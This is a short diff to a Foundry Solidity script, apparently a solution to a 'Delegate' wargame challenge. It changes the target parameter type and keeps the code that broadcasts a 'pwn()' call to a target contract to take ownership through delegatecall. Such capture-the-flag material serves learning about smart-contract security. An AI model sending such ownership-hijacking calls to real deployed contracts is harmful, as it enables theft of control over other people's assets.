@@ -6,7 +6,7 @@ import { Script, console } from "forge-std/Script.sol";
 contract DelegateSolution is Script {
     error Delegate_CallFailed();
 
-    function run(address payable target) public {
+    function run(address target) public {
         bytes memory data = abi.encodeWithSignature("pwn()");
         vm.startBroadcast();
         (bool success, ) = target.call(data);
